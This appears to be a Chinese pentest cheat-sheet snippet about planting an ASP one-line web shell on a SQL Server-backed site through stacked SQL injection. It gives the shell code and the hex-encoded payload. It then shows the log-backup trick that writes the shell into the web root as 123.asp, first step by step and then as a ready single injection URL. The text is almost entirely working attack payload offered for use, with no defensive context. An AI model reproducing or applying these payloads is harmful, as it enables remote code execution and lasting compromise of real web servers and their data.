```asp
<%execute(request("a"))%>
```

差异备份经常会出错，不稳定

log备份一句话（需burp 转化accis）

```sql
;IF EXISTS(select table_name from information_schema.tables where table_name='test_tmp')drop table test_tmp;alter database mydb set RECOVERY FULL;
; drop table test_tmp;create table test_tmp (a image);backup log mydb to disk ='C:/inetpub/wwwroot/www.demo1.com/asp.bak' with init;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);backup log mydb to disk = 'C:/inetpub/wwwroot/www.demo1.com/123.asp'
```

 分布执行：

;drop table test_tmp
;create table test_tmp (a image);
;backup log mydb to disk ='C:/inetpub/wwwroot/www.demo1.com/asp.bak' with init;
;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA)
;backup log mydb to disk = 'C:/inetpub/wwwroot/www.demo1.com/123.asp'
;drop table test_tmp

一键执行：

```http
http://www.demo1.com/index.aspx?id=1;IF EXISTS(select table_name from information_schema.tables where table_name='test_tmp')drop table test_tmp;create table  test_tmp  (a image);backup log mydb to disk ='C:/inetpub/wwwroot/www.demo1.com/asp.bak' with init;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);backup log mydb to disk = 'C:/inetpub/wwwroot/www.demo1.com/123.asp';drop table test_tmp
```

 